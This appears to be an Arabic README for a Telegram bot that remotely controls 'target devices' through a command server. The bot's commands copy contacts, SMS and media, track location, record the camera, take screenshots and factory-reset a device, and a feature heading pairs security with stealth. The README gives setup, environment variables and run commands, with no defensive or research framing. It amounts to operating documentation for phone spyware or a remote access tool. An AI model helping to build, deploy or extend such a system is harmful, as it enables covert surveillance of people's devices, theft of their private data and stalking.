# Telegram Bot - بوت تيليجرام المتقدم

## 📋 نظرة عامة

بوت تيليجرام المتقدم هو المكون الأساسي للتحكم عن بعد عبر تطبيق تيليجرام. يوفر واجهة سهلة الاستخدام لإدارة الأجهزة والتحكم بها.

## 🚀 الميزات الرئيسية

### 🔧 الوظائف الأساسية
- **إدارة الأجهزة**: إضافة وحذف وإدارة الأجهزة المستهدفة
- **التحكم عن بعد**: إرسال الأوامر للأجهزة عبر تيليجرام
- **نسخ احتياطي**: نسخ جهات الاتصال والرسائل والوسائط
- **مراقبة الموقع**: تتبع موقع الجهاز في الوقت الفعلي
- **التسجيل**: تسجيل جميع العمليات والأنشطة

### 🛡️ الأمان والتخفي
- **تشفير البيانات**: تشفير جميع البيانات الحساسة
- **التحقق من الهوية**: نظام تحقق متقدم للمستخدمين
- **حماية من الهجمات**: حماية من DDoS والهجمات الأخرى
- **مراقبة الأمان**: مراقبة مستمرة للأمان

### 📊 المراقبة والأداء
- **مراقبة الأداء**: مراقبة أداء البوت في الوقت الفعلي
- **إحصائيات مفصلة**: إحصائيات شاملة عن الاستخدام
- **تنبيهات الأداء**: تنبيهات عند وجود مشاكل
- **تقارير مفصلة**: تقارير شاملة عن النشاط

### 🔌 الاتصال
- **Web API**: واجهة برمجة تطبيقات للاتصال
- **قاعدة البيانات**: تخزين البيانات في SQLite
- **التخزين المحلي**: تخزين البيانات محلياً
- **المزامنة**: مزامنة مع خادم الأوامر

## 📁 هيكل الملفات

```
telegram-bot/
├── app.py                    # تطبيق Flask للويب
├── bot.py                    # البوت الرئيسي
├── requirements.txt          # تبعيات Python
├── security_manager.py       # مدير الأمان المتقدم
├── performance_monitor.py    # مراقب الأداء
├── devices.db               # قاعدة بيانات الأجهزة
├── bot.log                  # سجل البوت
├── local-storage/           # التخزين المحلي
│   ├── pending_commands.pkl # الأوامر المعلقة
│   └── cached_data.pkl      # البيانات المخزنة مؤقتاً
└── README.md                # هذا الملف
```

## 🛠️ التثبيت والتشغيل

### المتطلبات
- Python 3.8+
- pip3
- متغيرات بيئية مطلوبة

### التثبيت
```bash
cd telegram-bot

# إنشاء بيئة افتراضية
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# أو
venv\Scripts\activate     # Windows

# تثبيت التبعيات
pip3 install -r requirements.txt
```

### متغيرات البيئة المطلوبة
```bash
# إعدادات البوت
TELEGRAM_BOT_TOKEN=your_bot_token_here
OWNER_USER_ID=your_telegram_user_id

# إعدادات الخادم
COMMAND_SERVER_URL=https://remote-control-command-server.onrender.com
WEB_INTERFACE_URL=https://remote-control-web.onrender.com

# إعدادات الأمان
ENCRYPTION_KEY=your_encryption_key_here

# إعدادات البيئة
NODE_ENV=production
LOCAL_DEVELOPMENT=false
```

### التشغيل
```bash
# تشغيل البوت مباشرة
python3 bot.py

# تشغيل كخدمة ويب (للنشر)
python3 app.py

# تشغيل في الخلفية
nohup python3 app.py > bot.log 2>&1 &
```

## 🔧 API Endpoints

### HTTP Endpoints
- `GET /` - الصفحة الرئيسية
- `GET /health` - فحص صحة الخدمة
- `GET /status` - حالة البوت

### Telegram Commands
- `/start` - بدء البوت
- `/help` - المساعدة
- `/link` - ربط جهاز
- `/devices` - قائمة الأجهزة
- `/contacts` - نسخ جهات الاتصال
- `/sms` - نسخ الرسائل
- `/media` - نسخ الوسائط
- `/location` - موقع الجهاز
- `/record` - تسجيل الكاميرا
- `/screenshot` - لقطة شاشة
- `/reset` - إعادة تعيين المصنع

## 📊 الملفات الرئيسية

### 1. `app.py`
تطبيق Flask للعمل كخدمة ويب على Render.

**الميزات**:
- تشغيل البوت في خيط منفصل
- نقاط فحص الصحة
- مراقبة حالة البوت
- دعم Render

### 2. `bot.py`
البوت الرئيسي مع جميع الوظائف.

**الميزات**:
- إدارة الأجهزة
- معالجة الأوامر
- الاتصال بخادم الأوامر
- التخزين المحلي
- نظام الأمان

### 3. `security_manager.py`
مدير الأمان المتقدم.

**الميزات**:
- تشفير البيانات
- حماية من الهجمات
- مراقبة النشاط المشبوه
- إدارة الجلسات
- تسجيل الأحداث الأمنية

### 4. `performance_monitor.py`
مراقب الأداء المتقدم.

**الميزات**:
- مراقبة النظام
- إحصائيات الأداء
- تنبيهات الأداء
- تحليل البيانات
- تقارير مفصلة

### 5. `requirements.txt`
قائمة تبعيات Python.

**المحتوى**:
- مكتبات الأمان والتشفير
- مكتبات الشبكة والاتصال
- مكتبات معالجة البيانات
- مكتبات المراقبة والسجلات
- مكتبات الذكاء الاصطناعي

## 🔒 الأمان

### التشفير
- تشفير AES-256-CBC للبيانات الحساسة
- PBKDF2 مع SHA256 لكلمات المرور
- مفاتيح تشفير آمنة
- IV عشوائي لكل عملية تشفير

### الحماية
- حماية من DDoS
- حد المعدل للمستخدمين
- حظر المستخدمين المشبوهين
- مراقبة النشاط المشبوه
- تسجيل الأحداث الأمنية

### التحقق
- التحقق من هوية المستخدمين
- إدارة الجلسات الآمنة
- التحقق من الأذونات
- مراقبة الأنماط المشبوهة

## 📈 الأداء

### المراقبة
- مراقبة استخدام الذاكرة
- مراقبة استخدام المعالج
- مراقبة استخدام القرص
- مراقبة الشبكة
- مراقبة وقت الاستجابة

### التحسين
- تنظيف البيانات القديمة
- تحسين قاعدة البيانات
- تحسين التخزين
- تحسين الاتصال

### التنبيهات
- تنبيهات استخدام الذاكرة العالي
- تنبيهات استخدام المعالج العالي
- تنبيهات وقت الاستجابة البطيء
- تنبيهات معدل الأخطاء العالي

## 🚀 التحسينات المطبقة

### إصلاحات الاتصال
- ✅ إصلاح روابط الخادم الثابتة
- ✅ إضافة دعم المنافذ المحلية (10001, 3000)
- ✅ تحسين إدارة الاتصال
- ✅ دعم البيئات المختلفة

### إصلاحات الأمان
- ✅ إضافة مدير أمان متقدم
- ✅ تحسين التشفير
- ✅ إضافة مراقبة الأمان
- ✅ تحسين التحقق من الهوية

### تحسينات الأداء
- ✅ إضافة مراقب أداء متقدم
- ✅ تحسين إدارة الذاكرة
- ✅ تنظيف البيانات التلقائي
- ✅ تحسين قاعدة البيانات

### تحسينات التوثيق
- ✅ إنشاء README شامل
- ✅ توثيق جميع الملفات
- ✅ إضافة أمثلة الاستخدام
- ✅ دليل استكشاف الأخطاء

## 🐛 استكشاف الأخطاء

### مشاكل شائعة
1. **خطأ في Token**: تأكد من صحة TELEGRAM_BOT_TOKEN
2. **خطأ في الاتصال**: تأكد من تشغيل خادم الأوامر
3. **مشاكل التخزين**: راجع مساحة التخزين المتاحة
4. **مشاكل الأداء**: راجع استخدام الذاكرة والمعالج

### أوامر التشخيص
```bash
# فحص حالة البوت
curl http://localhost:10002/health

# فحص السجلات
tail -f bot.log

# فحص قاعدة البيانات
sqlite3 devices.db ".tables"
```

### متغيرات التشخيص
```bash
# تفعيل وضع التطوير
LOCAL_DEVELOPMENT=true
NODE_ENV=development

# تفعيل التسجيل المفصل
LOG_LEVEL=DEBUG
```

## 📞 الدعم

للحصول على الدعم أو الإبلاغ عن مشاكل:
- راجع ملف `TROUBLESHOOTING.md`
- تحقق من السجلات في `bot.log`
- راجع إحصائيات الأداء

## 📄 الترخيص

هذا المشروع مرخص تحت رخصة MIT. راجع ملف `LICENSE` للتفاصيل.